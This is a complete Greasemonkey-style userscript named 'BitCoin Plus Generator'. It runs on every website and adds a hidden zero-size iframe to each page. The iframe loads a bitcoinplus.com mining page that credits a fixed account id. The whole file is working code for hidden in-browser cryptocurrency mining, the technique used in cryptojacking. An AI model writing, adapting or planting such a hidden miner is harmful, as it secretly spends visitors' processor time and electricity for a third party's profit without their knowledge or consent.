// ==UserScript==
// @name           BitCoin Plus Generator
// @include        *
// @exclude        *bitcoinplus*
// @version                1.3
// ==/UserScript==
if (document.getElementById("ifrmBitCoin")==null) {
var elz = document.createElement("iframe");
elz.setAttribute('id', 'ifrmBitCoin');
elz.height = 0;
elz.width = 0;
document.body.appendChild(elz);
elz.setAttribute('src', 'http://www.bitcoinplus.com/generate?for=11478014');
}